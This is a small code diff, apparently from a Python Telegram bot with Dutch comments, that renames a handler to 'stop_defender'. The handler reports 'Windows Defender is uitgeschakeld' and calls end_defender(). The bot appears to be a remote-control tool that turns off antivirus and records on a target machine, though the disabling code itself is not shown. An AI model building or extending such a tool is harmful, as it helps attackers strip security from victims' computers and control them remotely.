@@ -33,7 +33,7 @@ async def record_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 # Windows defender uitzetten
-async def record_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def stop_defender(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # meld dat Windows defender uit is
     await context.bot.send_message(chat_id=update.effective_chat.id, text="Windows Defender is uitgeschakeld")
     end_defender()
